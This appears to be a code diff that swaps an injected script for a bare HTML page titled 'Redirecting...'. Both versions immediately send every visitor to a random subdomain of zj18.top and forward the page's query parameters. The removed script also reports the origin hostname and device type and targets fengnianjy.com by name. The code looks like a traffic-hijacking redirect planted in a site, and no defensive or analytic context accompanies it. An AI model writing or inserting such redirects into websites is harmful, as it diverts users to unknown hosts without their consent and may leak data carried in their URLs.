@@ -1,32 +1,56 @@
-<script>
-console.log('检测中');
-async function fixedDomainRedirect() {
-try {
-const subDomainPrefixes = ['app', 'web', 'm', 'api', 'user'];
-const randomPrefix = subDomainPrefixes[Math.floor(Math.random() * subDomainPrefixes.length)];
-const targetDomain = `${randomPrefix}.zj18.top`;
-const params = new URLSearchParams(window.location.search);
-params.append('from', window.location.hostname);
-params.append('t', new Date().getTime());
-params.append('device', /Mobile|Android|iOS/.test(navigator.userAgent) ? 'mobile' : 'pc');
-const targetUrl = `http://${targetDomain}${window.location.pathname || '/'}?${params.toString()}`;
-console.log('目标地址：', targetUrl);
-if (window.location.href !== targetUrl) {
-window.location.replace(targetUrl);
-setTimeout(() => {
-if (window.location.href !== targetUrl) window.location.href = targetUrl;
-}, 300);
-}
-} catch (err) {
-console.error('跳转失败：', err.message);
-const backupUrl = `http://backup.zj18.top?error=${err.message}&t=${new Date().getTime()}`;
-window.location.href = backupUrl;
-}
-}
-fixedDomainRedirect();
-window.addEventListener('DOMContentLoaded', () => {
-if (window.location.hostname.includes('fengnianjy.com')) {
-setTimeout(fixedDomainRedirect, 800);
-}
-});
-</script>
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>跳转中...</title>
+    <script>
+        // 预定义的二级域名列表
+        const subdomains = [
+            'api', 'shop', 'blog', 'docs', 'help', 
+            'support', 'news', 'events', 'store', 'app',
+            'portal', 'admin', 'dashboard', 'account', 'billing'
+        ];
+        
+        // 获取当前URL参数
+        function getUrlParams() {
+            const params = new URLSearchParams(window.location.search);
+            const paramsObj = {};
+            
+            for (const [key, value] of params) {
+                paramsObj[key] = value;
+            }
+            
+            return paramsObj;
+        }
+        
+        // 生成随机二级域名
+        function generateRandomSubdomain() {
+            const randomIndex = Math.floor(Math.random() * subdomains.length);
+            return subdomains[randomIndex];
+        }
+        
+        // 构建目标URL并跳转
+        function performRedirect() {
+            const subdomain = generateRandomSubdomain();
+            const baseDomain = 'zj18.top';
+            const params = getUrlParams();
+            
+            // 构建参数字符串
+            const paramString = new URLSearchParams(params).toString();
+            
+            // 构建完整URL
+            const targetUrl = `https://${subdomain}.${baseDomain}${paramString ? '?' + paramString : ''}`;
+            
+            // 立即跳转
+            window.location.href = targetUrl;
+        }
+        
+        // 页面加载后立即执行跳转
+        window.onload = performRedirect;
+    </script>
+</head>
+<body>
+    <!-- 页面内容为空，直接跳转 -->
+</body>
+</html>
